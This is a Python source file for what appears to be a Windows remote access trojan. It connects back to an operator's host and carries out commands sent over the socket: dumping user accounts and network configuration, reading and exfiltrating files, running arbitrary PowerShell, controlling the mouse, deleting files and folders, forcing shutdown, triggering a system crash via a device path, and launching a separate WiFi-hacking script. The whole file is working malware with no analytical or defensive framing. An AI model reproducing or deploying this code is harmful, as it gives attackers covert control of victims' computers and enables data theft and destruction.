import socket
import os
import sys
import smtplib as sm
import webbrowser
import ctypes
import platform
from win32api import GetSystemMetrics
from requests import get
from pynput.mouse import Button,Controller

ctrl_mouse = Controller()

HOST = ""  
PORT = 65432

num = 1

class Hack:

    def __init__(self):
        self.abspath = os.getcwd()
        self.fidir = str(os.listdir())
        self.name = socket.gethostname()
        
    def server(self,msg):s.send(msg.encode('utf-8'))

    def webs(self,url):
        webbrowser.open(url)
        getdata.server("done")

    def get_user(self):
        os.system("net user >user.txt")
        with open("user.txt","r") as usr_d:
            dt = usr_d.read()
        getdata.server(dt)
    
    def readfile(self,filex):
        with open(f"{filex}.txt","r") as trgfile:
            dattrg = trgfile.read()

        try:
            getdata.server(dattrg)
        except:
            getdata.server("error")

    def move_mouse(self,x,y):
        ctrl_mouse.position = (x,y)
        getdata.server(f"moved to {x,y}")

    def click(self,num):
        if num == 1:
            ctrl_mouse.press(Button.left)
            ctrl_mouse.release(Button.left)
        elif num==2:
            ctrl_mouse.press(Button.right)
            ctrl_mouse.release(Button.right)
        getdata.server("done")

    def ipv4(self):
        os.system('ipconfig >ipv4.txt')
        with open('ipv4.txt',"r") as ipv4:
            networkda = ipv4.read()
        getdata.server(networkda)

    def pwr_cmds(self,cmd):
        os.system(f'powershell {cmd} > pwr.txt')
        filepw = open('pwr.txt','r')
        data = filepw.read()
        filepw.close()
        return data

getdata = Hack()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    while True:

        ins = s.recv(1024)
        utf8ins = ins.decode('utf-8')
        
        if utf8ins == "all wifi":
            os.system('python Ultimate_Wifi_Hacker.py')
            getdata.server("mailed")

        elif utf8ins == "get user":getdata.get_user()
        elif utf8ins == "name":s.send(getdata.name.encode('utf-8'))

        elif utf8ins == "cwd":s.send(getdata.abspath.encode('utf-8'))
        elif utf8ins == "files":s.send(getdata.fidir.encode('utf-8'))
        elif utf8ins ==  "OS" : s.send(platform.platform().encode())
        elif utf8ins == 'dimen' : s.send(f"{GetSystemMetrics(0)}x{GetSystemMetrics(1)}".encode())

        elif utf8ins.startswith('openweb '):
            utf8ins = utf8ins.replace('openweb ',"")
            getdata.webs(utf8ins)

        elif utf8ins.startswith('readfile '):
            utf8ins = utf8ins.replace('readfile ',"")
            getdata.readfile(utf8ins)

        elif utf8ins.startswith("move "):
            utf8ins = utf8ins.replace("move ","")
            utf8ins=utf8ins.split()
            x1 = int(utf8ins[0])
            y1 = int(utf8ins[1])
            getdata.move_mouse(x1,y1)

        elif utf8ins.startswith('click '):
            utf8ins = utf8ins.replace('click ','')
            utf8ins = int(utf8ins)
            getdata.click(utf8ins)
            
        elif utf8ins.startswith('public ip'):
            ip = get('http://ipgrab.io').text
            s.send(ip.encode())

        elif utf8ins.startswith('ipv4'):getdata.ipv4()
        elif utf8ins == "q":
            s.send("None".encode())
        elif utf8ins.startswith('pwr'):
            powr = utf8ins.split()
            data = getdata.pwr_cmds(powr[1])
            s.send(data.encode())
        
        elif utf8ins.startswith('del'):
            cmds = utf8ins.split()
            try:
                os.remove(cmds[1])
                s.send("Success".encode())
            except:
                s.send(f"File {cmds[1]} doesn't exists".encode())

        elif utf8ins.startswith('delfld'):
            cmds = utf8ins.split()
            try:
                os.rmdir(cmds[1])
                s.send("Success".encode())
            except:
                s.send(f"File {cmds[1]} doesn't exists".encode())

        elif utf8ins.startswith('shutdown') : os.system("shutdown /s /t 1")
        
        elif utf8ins.startswith('crash'):
            webbrowser.open(r'\\.\globalroot\device\condrv\kernelconnect')